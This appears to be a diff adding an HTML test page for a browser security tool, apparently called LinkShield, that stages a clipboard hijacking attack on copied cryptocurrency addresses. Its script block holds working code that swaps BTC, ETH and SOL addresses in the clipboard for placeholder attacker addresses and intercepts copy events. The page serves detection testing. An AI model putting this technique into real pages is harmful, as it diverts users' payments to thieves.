@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clipboard Crypto Hijacking Test - LinkShield</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            max-width: 800px;
+            margin: 0 auto;
+            background: #1a1a2e;
+            color: #eee;
+        }
+        .test-info {
+            background: #333;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 30px;
+            font-size: 12px;
+        }
+        .crypto-box {
+            background: #16213e;
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 20px;
+        }
+        .crypto-box h2 {
+            color: #00d4ff;
+            margin-top: 0;
+        }
+        .address-display {
+            background: #0f0f1a;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            word-break: break-all;
+            margin: 15px 0;
+            border: 1px solid #333;
+        }
+        .copy-btn {
+            background: linear-gradient(135deg, #00d4ff, #0099cc);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .warning-box {
+            background: #ff4444;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="test-info">
+        <strong>TEST:</strong> Clipboard Crypto Address Hijacking<br>
+        <strong>Expected:</strong> Warning when clipboard is manipulated<br>
+        <strong>Triggers:</strong> clipboardHijackingCryptoTitle, CRYPTO_ADDRESS_PATTERNS
+    </div>
+
+    <h1>💰 Crypto Wallet Addresses</h1>
+
+    <div class="crypto-box">
+        <h2>Bitcoin (BTC)</h2>
+        <p>Send BTC to this address:</p>
+        <div class="address-display" id="btc-address">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+        <button class="copy-btn" onclick="copyBTC()">📋 Copy Address</button>
+    </div>
+
+    <div class="crypto-box">
+        <h2>Ethereum (ETH)</h2>
+        <p>Send ETH/ERC-20 tokens to:</p>
+        <div class="address-display" id="eth-address">0x742d35Cc6634C0532925a3b844Bc9e7595f2bB45</div>
+        <button class="copy-btn" onclick="copyETH()">📋 Copy Address</button>
+    </div>
+
+    <div class="crypto-box">
+        <h2>Solana (SOL)</h2>
+        <p>Send SOL to:</p>
+        <div class="address-display" id="sol-address">7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV</div>
+        <button class="copy-btn" onclick="copySOL()">📋 Copy Address</button>
+    </div>
+
+    <div class="warning-box">
+        <strong>⚠️ TEST SCENARIO</strong><br>
+        This page contains malicious JavaScript that attempts to replace crypto addresses in your clipboard.
+        LinkShield should detect and warn about this attack.
+    </div>
+
+    <script>
+        // Attacker's wallet addresses
+        const ATTACKER_BTC = 'bc1qattackeraddress1234567890abcdefgh';
+        const ATTACKER_ETH = '0xAttacker1234567890123456789012345678';
+        const ATTACKER_SOL = 'AttackerSolanaAddress1234567890123456';
+
+        // Legitimate addresses shown to user
+        const LEGIT_BTC = 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh';
+        const LEGIT_ETH = '0x742d35Cc6634C0532925a3b844Bc9e7595f2bB45';
+        const LEGIT_SOL = '7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV';
+
+        // ATTACK: Intercept clipboard and replace addresses
+        async function hijackClipboard(legitAddress, attackerAddress, type) {
+            try {
+                // First, write the legitimate address
+                await navigator.clipboard.writeText(legitAddress);
+                console.log(`[ATTACK] User thinks they copied: ${legitAddress}`);
+
+                // Then immediately replace with attacker's address
+                setTimeout(async () => {
+                    try {
+                        await navigator.clipboard.writeText(attackerAddress);
+                        console.log(`[ATTACK] Replaced with attacker address: ${attackerAddress}`);
+                    } catch (e) {
+                        console.log('[ATTACK] Clipboard replacement blocked');
+                    }
+                }, 100);
+
+            } catch (e) {
+                console.log('[ATTACK] Clipboard access blocked by browser or extension');
+            }
+        }
+
+        function copyBTC() {
+            hijackClipboard(LEGIT_BTC, ATTACKER_BTC, 'BTC');
+            alert('Address copied! (In a real attack, this would be replaced with attacker address)');
+        }
+
+        function copyETH() {
+            hijackClipboard(LEGIT_ETH, ATTACKER_ETH, 'ETH');
+            alert('Address copied! (In a real attack, this would be replaced with attacker address)');
+        }
+
+        function copySOL() {
+            hijackClipboard(LEGIT_SOL, ATTACKER_SOL, 'SOL');
+            alert('Address copied! (In a real attack, this would be replaced with attacker address)');
+        }
+
+        // ATTACK: Also try to intercept copy events globally
+        document.addEventListener('copy', (e) => {
+            const selection = window.getSelection().toString();
+
+            // Check if user is copying a crypto address
+            const btcPattern = /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/;
+            const ethPattern = /^0x[a-fA-F0-9]{40}$/;
+
+            if (btcPattern.test(selection)) {
+                console.log('[ATTACK] Detected BTC address copy, attempting hijack');
+                e.clipboardData.setData('text/plain', ATTACKER_BTC);
+                e.preventDefault();
+            } else if (ethPattern.test(selection)) {
+                console.log('[ATTACK] Detected ETH address copy, attempting hijack');
+                e.clipboardData.setData('text/plain', ATTACKER_ETH);
+                e.preventDefault();
+            }
+        });
+
+        console.log('[TEST] Clipboard Crypto Hijacking scenario loaded');
+        console.log('[TEST] Expected: LinkShield should detect clipboard manipulation');
+    </script>
+</body>
+</html>
